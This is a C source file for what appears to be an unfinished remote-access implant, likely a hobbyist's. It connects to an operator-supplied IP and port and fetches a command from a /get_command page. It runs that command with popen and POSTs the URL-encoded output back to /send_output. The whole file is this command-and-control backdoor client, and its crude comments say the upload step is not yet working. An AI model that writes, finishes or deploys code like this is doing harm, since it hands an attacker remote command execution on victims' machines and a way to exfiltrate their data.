#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>

#define BUFFER_SIZE 4096

// Function To Remove New Line characters, 
void trim_trailing_newlines(char *str) {
    size_t len = strlen(str);
    while (len > 0 && (str[len - 1] == '\n' || str[len - 1] == '\r')) {
        str[--len] = '\0';  // Remove the trailing newline
    }
}


// Function To URL Encode a string for sending with POST Request
char* url_encode(const char *str) {
    // Get Input String Length
    size_t len = strlen(str);
    // Create a Buffer For Our Encoded String
    char *encoded = malloc(len * 3 + 1); // Doing * 3 as a string may have all %xx
    if (!encoded) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    char *ptr = encoded;

    // Loop Through String To Check Each Character And If it needs to be encoded
    for (size_t i = 0; i < len; ++i) {
        // Type Cast Current Character To an Unsigned Int
        unsigned char c = (unsigned char)str[i];
        // Quick Check to see if its a alphanumeric character or is a safe char to use
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            // update pointer if so
            *ptr++ = c;
        } else {
            // else we convert the character to its hex value (e.g / to %2f)
            ptr += sprintf(ptr, "%%%02X", c);
        }
    }
    // Finally Return the encoded String
    return encoded;
}




char* get_command(const char* ip, int port, int sockFD) {
  // Buffers For Headers Reponse ect
	char headers[BUFFER_SIZE];
	char response[BUFFER_SIZE];
	int bytes_read;

  // Copy the required Headers into the buffer
	snprintf(headers, sizeof(headers), "GET /get_command HTTP/1.1\r\n"
									"Host: %s:%d\r\n"
									"Connection: keep-alive\r\n\r\n", ip, port);

  // Send GET Request to the server to grab the command-to-run page
	int bytes_sent = send(sockFD, headers, strlen(headers), 0);
	if (bytes_sent <= 0) {
		printf("Failed Sending GET request\n");
		return NULL;
	}

  // Recv Reponse From Server
	bytes_read = recv(sockFD, response, sizeof(response), 0);
	if (bytes_read <= 0) {
		fprintf(stderr, "Failed Reading Response");
		return NULL;
	}
  // Null terminate the reponse
	response[bytes_read] = '\0';

  // Vars Used For pasring the html to find command
	char* start_tag = "<command>";
	char* end_tag = "</command>";

	char* start = strstr(response, start_tag);
	char* end = strstr(response, end_tag);

  
	if(start && end && start < end) {
		start += strlen(start_tag);
		size_t com_len = end - start;
		char* command = malloc(com_len + 1);
		if (command == NULL) {
			fprintf(stderr, "Malloc Failed\n");
			return NULL;
		}

    // Copy the command into a buffer for returning, 
		strncpy(command, start, com_len);
    // null terminate that shit again
		command[com_len] = '\0';
    // Finally Return it
		return command;
	} else {
		fprintf(stderr, "Command Not Found\n");
		return NULL;
	}

}

// Stupid Fucking Function, the server just refuses to acknowledge this Post Request
// need to test more
int send_output(int sockFD, const char* command, const char* ip, int portNo) {
	char headers[BUFFER_SIZE] = { 0 };
	char command_buffer[BUFFER_SIZE] = { 0 };
	char fullout[BUFFER_SIZE] = { 0 };
	FILE *f;


  // Run command that we got from the GET Request
	f = popen(command, "r");

  // Read and store the output (no shit)
	while(fgets(command_buffer, BUFFER_SIZE, f) != NULL) {
		strncat(fullout, command_buffer, sizeof(fullout) - strlen(fullout) - 1);
	}
	pclose(f);
  // Remove \n && \0
	trim_trailing_newlines(fullout);
  // encode that shit
	char* encoded = url_encode(fullout);
	printf("%s\n", encoded);

  // determine the content-lenght value
	size_t content_length = strlen("output=") + strlen(encoded);


  // Create The Headers(Swear this shit is right server is just refusing it)
	snprintf(headers, sizeof(headers), 
	         "POST /send_output HTTP/1.1\r\n"
	         "Host: %s:%d\r\n"
	         "Content-Type: application/x-www-form-urlencoded\r\n"
	         "Content-Length: %d\r\n"
	         "Connection: keep-alive\r\n\r\n"
	         "output=%s", 
	         ip, portNo, content_length, encoded);

	printf("HEADERS\n%s\n", headers);


	ssize_t total_size = strlen(headers);
	ssize_t bytes_sent = 0;

  // Finally Send the command Output Back to the server
	while (bytes_sent < total_size) {
        ssize_t result = send(sockFD, headers + bytes_sent, total_size - bytes_sent, 0);
        if (result < 0) {
            perror("send");
            return 0;
        }
        bytes_sent += result;
    }

  // Debug shit
	printf("total: %zu\nsent: %zu\n", total_size, bytes_sent);


	//printf("Sent %d Bytes\n", bytes_sent);

	return 1;
}


int main(int argc, char *argv[])
{
	int server_fd, opt = 1;
	struct sockaddr_in server;
	char buffer[BUFFER_SIZE] = { 0 };
	char command_buffer[BUFFER_SIZE] = { 0 };
	char *ip = argv[1];
	int portNo = atoi(argv[2]);
	char* command;

	socklen_t serverSize = sizeof(server);
	//socklen_t clientSize = sizeof(client);

  // Create TCP Socket
	if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		fprintf(stderr, "Socket Creation Failed\n");
		return 1;
	}

  // set up values for struct
	server.sin_family = AF_INET;
	server.sin_port = htons(portNo);
  // Convert IP To Network Byte Order
	if((inet_pton(AF_INET, ip, &server.sin_addr.s_addr)) <= 0) {
		fprintf(stderr, "Failed Converting IP\n");
		return 1;
	}

  // Finally Connect to the server
	if(connect(server_fd, (struct sockaddr*)&server, sizeof(server)) < 0) {
		fprintf(stderr, "Failed Connecting");
		return 1;
	}

  // Connect to Server And Get Command (changing this to loop and then sleep if no command found)
	command = get_command(ip, portNo, server_fd);

	if(!command) {
		printf("Couldnt Grab Command");
		return 1;
	}

	printf("Command To Run: %s\n", command);
	sleep(2);

  // Finally Send the output, to bad this shit isnt working
	int check = send_output(server_fd, command, ip, portNo);


	if(!check) {
		printf("FAIL");

	}



	return 0;
}
